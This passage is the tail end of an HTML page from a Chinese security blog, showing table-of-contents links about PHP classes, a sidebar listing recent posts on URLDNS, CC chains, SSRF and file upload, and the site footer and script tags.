href="#SoapClient-%E7%B1%BB"><span class="toc-number">10.6.</span> <span class="toc-text">SoapClient 类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimpleXMLElement-%E7%B1%BB"><span class="toc-number">10.7.</span> <span class="toc-text">SimpleXMLElement 类</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/URLDNS/" title="URLDNS"><img src="/img/12.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="URLDNS"/></a><div class="content"><a class="title" href="/2025/11/25/URLDNS/" title="URLDNS">URLDNS</a><time datetime="2025-11-25T14:03:06.000Z" title="Created 2025-11-25 22:03:06">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/CC%E9%93%BE/" title="CC链"><img src="/img/9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CC链"/></a><div class="content"><a class="title" href="/2025/11/25/CC%E9%93%BE/" title="CC链">CC链</a><time datetime="2025-11-25T14:02:54.000Z" title="Created 2025-11-25 22:02:54">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="信息泄露"><img src="/img/24.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="信息泄露"/></a><div class="content"><a class="title" href="/2025/11/25/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="信息泄露">信息泄露</a><time datetime="2025-11-25T13:50:42.000Z" title="Created 2025-11-25 21:50:42">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/upload/" title="upload"><img src="/img/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="upload"/></a><div class="content"><a class="title" href="/2025/11/25/upload/" title="upload">upload</a><time datetime="2025-11-25T13:44:39.000Z" title="Created 2025-11-25 21:44:39">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/SSRF/" title="SSRF"><img src="/img/13.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SSRF"/></a><div class="content"><a class="title" href="/2025/11/25/SSRF/" title="SSRF">SSRF</a><time datetime="2025-11-25T13:44:33.000Z" title="Created 2025-11-25 21:44:33">2025-11-25</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By lu1ux</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script src="/js/sakuraPlus.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
